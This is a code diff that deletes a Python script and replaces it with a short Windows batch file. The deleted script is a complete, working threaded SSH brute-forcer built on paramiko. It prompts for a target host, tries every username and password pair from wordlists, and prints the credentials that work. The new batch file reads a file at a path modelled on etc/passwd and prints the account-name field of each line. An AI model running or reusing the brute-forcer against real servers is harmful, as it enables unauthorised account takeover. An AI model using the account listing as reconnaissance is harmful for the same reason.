@@ -1,48 +1,14 @@
-import paramiko, sys, os
-import threading, time
+@echo off
+set "file_path=C:\path\to\etc\passwd"
+setlocal enabledelayedexpansion
 
-valid_combinations = []
+if not exist "%file_path%" (
+  echo File not found: "%file_path%"
+  exit /b
+)
 
-def ssh_connect(username, password):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(host, port=22, username=username, password=password)
-        valid_combinations.append((username, password))
-        print('[+] Found Password: ' + password + ', For Account: ' + username)
-    except:
-        print('[-] Incorrect Login: ' + username + ' / ' + password)
-    ssh.close()
+for /f "tokens=1 delims=:" %%a in (%file_path%) do (
+  echo %%a
+)
 
-host = input('[+] Target Address: ')
-usernames_file = 'usernames.txt'  # File containing usernames
-input_file = 'passwords.txt'  # File containing passwords
-
-if not (os.path.exists(usernames_file) and os.path.exists(input_file)):
-    print('[!!] One of the files does not exist')
-    sys.exit(1)
-
-print('* * * Starting Threaded SSH Bruteforce On ' + host + ' * * *')
-
-with open(usernames_file, 'r') as user_file:
-    usernames = user_file.read().splitlines()
-
-with open(input_file, 'r') as pass_file:
-    passwords = pass_file.read().splitlines()
-
-threads = []
-
-for username in usernames:
-    for password in passwords:
-        t = threading.Thread(target=ssh_connect, args=(username, password))
-        threads.append(t)
-        t.start()
-        time.sleep(1)
-
-# Wait for all threads to finish
-for t in threads:
-    t.join()
-
-print('\n[+] All Valid Matches:')
-for username, password in valid_combinations:
-    print('Username:', username, 'Password:', password)
+endlocal
